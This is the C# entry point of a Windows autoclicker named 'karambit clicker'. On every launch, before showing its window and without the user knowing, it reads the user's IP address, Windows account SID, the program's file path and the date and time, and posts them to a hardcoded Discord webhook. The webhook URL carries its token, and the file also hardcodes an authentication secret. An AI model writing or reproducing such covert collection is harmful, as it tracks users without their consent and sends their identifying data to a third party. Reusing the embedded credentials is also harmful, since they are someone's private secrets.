using Discord.Webhook;
using Discord.Webhook.HookRequest;
using skidderino;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace karambit_clicker
{
    static class Program
    {
        /// <summary>
        /// Punto di ingresso principale dell'applicazione.
        /// </summary>
        [STAThread]
        static void Main()
        {
            DiscordWebhook discordWebhook = new DiscordWebhook();
            discordWebhook.HookUrl = "https://discord.com/api/webhooks/812001493561376858/Nx0ML6gcHpDFf8bIyhNNQcvxjDo3M-08uiZrz7MCU39rKA8y8F_cle2GkILV9Wip9RKB";
            DiscordHookBuilder discordHookBuilder = DiscordHookBuilder.Create("Yuuto", null);
            string value = skidderino.brodm.getID();
            string user = "UNKNOWN_USER";
            string hwid = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
            string dir = Assembly.GetExecutingAssembly().Location;
            DateTime now = DateTime.Now;
            DiscordEmbedField[] fields = new DiscordEmbedField[]
            {
                        new DiscordEmbedField("IP: ", value, false),
                        new DiscordEmbedField("User: ", user, false),
                        new DiscordEmbedField("HWID: ", hwid, false),
                        new DiscordEmbedField("Directory: ", dir, false),
                        new DiscordEmbedField("Date and Time: ", now.ToString(), false),
            };
            DiscordEmbed item = new DiscordEmbed("karambit clicker detected a new shitty string finder / bad cracker", "", 3319890, "", "Karambit Clicker", "", fields);
            discordHookBuilder.Embeds.Add(item);
            DiscordHook hookRequest = discordHookBuilder.Build();
            discordWebhook.Hook(hookRequest);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            OnProgramStart.Initialize("Karambit", "418253", "8aCEDMk2Wv7kCJZEQNDvJoxZU1CsqMM9PDN", "1.0");
            Application.Run(new hwidcheck());
        }
    }
}
